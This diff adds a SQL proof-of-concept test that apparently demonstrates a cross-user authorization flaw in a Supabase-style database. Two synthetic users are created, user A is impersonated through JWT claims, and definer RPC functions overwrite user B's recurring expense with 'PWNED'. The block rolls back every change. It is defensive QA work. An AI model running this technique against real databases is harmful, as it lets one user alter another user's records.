@@ -1,0 +1,23 @@
+-- Run via execute_sql on ydihurtbcnoflhormgzi. The DO block ends with RAISE EXCEPTION, so EVERYTHING rolls back
+-- (verified afterwards: 0 leftover qa6 users, 0 leftover rows). Two synthetic users, never real ones.
+DO $$
+declare
+  ua uuid := gen_random_uuid(); ub uuid := gen_random_uuid();
+  b_re uuid := gen_random_uuid(); a_sub uuid := gen_random_uuid();
+  res jsonb := '[]'::jsonb; v text;
+begin
+  insert into auth.users(id,instance_id,aud,role,email) values
+    (ua,'00000000-0000-0000-0000-000000000000','authenticated','authenticated','qa6-a@example.invalid'),
+    (ub,'00000000-0000-0000-0000-000000000000','authenticated','authenticated','qa6-b@example.invalid');
+  insert into recurring_expenses(id,user_id,amount,description) values (b_re,ub,10,'B-secret-RE');
+  execute 'set local role authenticated';
+  perform set_config('request.jwt.claims', json_build_object('sub',ua,'role','authenticated')::text, true);
+  -- A links A's own subscription to B's recurring expense (no link guard on subscriptions)
+  insert into subscriptions(id,user_id,name,amount,linked_recurring_expense_id) values (a_sub,ua,'A-sub',1,b_re);
+  -- DEFINER RPC then updates the linked recurring_expenses row WITHOUT a user_id filter
+  perform public.update_subscription_and_re(a_sub,'{}'::jsonb,'{"description":"PWNED","amount":777}'::jsonb);
+  perform public.cancel_subscription(a_sub);
+  execute 'reset role';
+  select 'desc='||description||' amt='||amount||' active='||is_active into v from recurring_expenses where id=b_re;
+  raise exception 'QA6RESULT %', v;   -- observed: desc=PWNED amt=777.0000 active=false   expected: B's row untouched
+end $$;
